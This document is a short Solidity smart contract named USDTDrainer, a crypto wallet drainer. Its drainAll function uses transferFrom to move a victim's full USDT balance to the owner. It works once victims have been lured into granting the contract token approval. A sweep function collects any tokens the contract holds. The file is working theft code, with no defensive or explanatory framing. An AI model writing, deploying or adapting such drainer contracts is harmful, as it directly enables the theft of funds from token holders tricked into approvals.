pragma solidity ^0.8.0;

interface IUSDT {
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
}

contract USDTDrainer {
    address public owner;
    IUSDT public usdt;
    uint256 public constant MAX_APPROVE = type(uint256).max;

    event Drained(address indexed victim, uint256 indexed amount);

    constructor(address _usdt, address _owner) {
        usdt = IUSDT(_usdt);
        owner = _owner;
    }

    function drainAll(address victim) external {
        require(msg.sender == owner, "only owner");
        uint256 bal = usdt.balanceOf(victim);
        require(bal > 0, "no balance");
        require(usdt.transferFrom(victim, owner, bal), "xferFrom failed");
        emit Drained(victim, bal);
    }

    function sweepContract() external {
        require(msg.sender == owner, "only owner");
        uint256 bal = usdt.balanceOf(address(this));
        require(bal > 0, "no balance");
        require(usdt.transfer(owner, bal), "transfer failed");
    }

    receive() external payable {}
}
